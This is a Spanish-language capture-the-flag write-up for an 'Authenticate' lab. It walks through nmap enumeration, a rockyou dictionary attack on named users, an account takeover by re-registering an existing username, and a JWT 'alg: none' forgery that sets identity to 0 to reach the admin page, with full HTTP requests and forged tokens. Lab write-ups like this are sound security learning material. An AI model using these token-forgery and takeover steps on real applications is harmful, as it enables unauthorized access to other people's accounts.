# Authenticate 🛅

Security, Owasp top 10, Cron. (#nmap, #lfi, #gobuster, #session #javascript, #curl, #ssh2python.py, #linpeas.sh, #upload_file_nc.sh )

## Tabla de contenido

- [Enumeración](#Enumeración).
- [Web Site](#Web-Site).
- [Shell](#Shell). 


--------------------------------
### Enumeración
-------------------------------
Hacemos una revisión general:
```plain
nmap -sC -sV -oN nmap/initial 10.10.71.122
```

* -oN: Guardar el sondeo en formato normal.
* -sC: Realizar análisis con los scripts por defecto.
* -sV: Detección de la versión de servicios.

Resultado:
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 11:8e:34:34:df:42:17:7b:ab:dc:44:9b:03:17:36:bb (RSA)
|   256 a5:d7:ed:38:db:04:e3:ef:8c:8a:14:25:06:94:f5:a9 (ECDSA)
|_  256 f4:f0:ea:5d:64:b2:3e:cf:16:7d:ef:a8:67:a3:43:0c (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
|_http-title: Live demonstrations
7777/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
|_http-title: No Auth
8888/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
|_http-title: Auth hacks
MAC Address: 02:CC:F0:75:A4:C9 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
--------------------------------
### Dictionary Attack
-------------------------------
El ataque utilizado se hace a través del diccionario rockyou.txt, agregado a través del burpsuite para los siuientes usuarios:
* Jack
* Mike

--------------------------------
### Re-registration
-------------------------------
Utilizamos el endpoint de registro de usuario registrando " arthur", el cuál ya existe, el nuevo registro permite acceder al usuario existente.

--------------------------------
### JSON Web Token
-------------------------------

Los JWT se dividen en 3 partes:
1) Header:
```
{  "alg": "HS256", "typ": "JWT"}
```
* alg: Podría ser "HMAC", "RSA" o "SHA256".

2) Payload:
Contiene la data puede ser todo tipo según se requiera.
3) Signature:
Sirve para corroborar la integridad de los datos.


Cuando se visita la página alojada en el puerto "5000"
```
http://10.10.149.137:5000/
```
Utilizas las credenciales user:user seleccionar Authenticate-> "/auth" al interceptar la petición con burpsuite:

Request:
```
POST /auth HTTP/1.1
Host: 10.10.149.137:5000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 37
Origin: http://10.10.149.137:5000
Connection: close
Referer: http://10.10.149.137:5000/

{"username":"user","password":"user"}
```

Response
```
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 188
Server: Werkzeug/0.16.0 Python/3.6.9
Date: Thu, 26 Nov 2020 03:18:35 GMT

{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MDYzNjEwMTUsImlhdCI6MTYwNjM2MDcxNSwibmJmIjoxNjA2MzYwNzE1LCJpZGVudGl0eSI6MX0.LHBYwdUJ6EX8SMUj-ts5dBu0D3OR7fX_07ZTxdJl2aI"}
```

Posteriormente al seleccionar en el botón "Go" -> "/protected":
```
GET /protected HTTP/1.1
Host: 10.10.149.137:5000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MDYzNjEwMTUsImlhdCI6MTYwNjM2MDcxNSwibmJmIjoxNjA2MzYwNzE1LCJpZGVudGl0eSI6MX0.LHBYwdUJ6EX8SMUj-ts5dBu0D3OR7fX_07ZTxdJl2aI
Connection: close
Referer: http://10.10.149.137:5000/
```
Utilizaremos la siguiente página que realiza la decodificacion de jwt - HS256 "https://jwt.io/"

```
-----------     HEADER      -----------
{
  "typ": "JWT",
  "alg": "HS256"
}
---------------------------------------
-----------     Payload      -----------
{
  "exp": 1606361015,
  "iat": 1606360715,
  "nbf": 1606360715,
  "identity": 1
}
---------------------------------------
------     VERIFY SIGNATURE      ------
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  
your-256-bit-secret

) secret base64 encoded
---------------------------------------
```
1) Primera parte "HEADER".
2) Segunda parte "Payload".
```
{"typ":"JWT","alg":"NONE"}
{"exp":1586620929,"iat":1586620629,"nbf":1586620629,"identity":2}
```
1)Encriptando primera parte (base64).
2)Encriptando segunda parte (base64).
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0K
eyJleHAiOjE1ODY2MjA5MjksImlhdCI6MTU4NjYyMDYyOSwibmJmIjoxNTg2NjIwNjI5LCJpZGVudGl0eSI6Mn0K
```

Utilizaremos el mismo método para acceder al admin cambiando el identity por 0:
```
{"exp":1586620929,"iat":1586620629,"nbf":1586620629,"identity":0}
eyJleHAiOjE1ODY2MjA5MjksImlhdCI6MTU4NjYyMDYyOSwibmJmIjoxNTg2NjIwNjI5LCJpZGVudGl0eSI6MH0K
```
```
GET /protected HTTP/1.1
Host: 10.10.149.137:5000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0K.eyJleHAiOjE1ODY2MjA5MjksImlhdCI6MTU4NjYyMDYyOSwibmJmIjoxNTg2NjIwNjI5LCJpZGVudGl0eSI6MH0K.
Connection: close
Referer: http://10.10.149.137:5000/
```
La llave obtenida: 
```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 35
Server: Werkzeug/0.16.0 Python/3.6.9
Date: Thu, 26 Nov 2020 04:07:49 GMT

Welcome admin: 9249****************28
```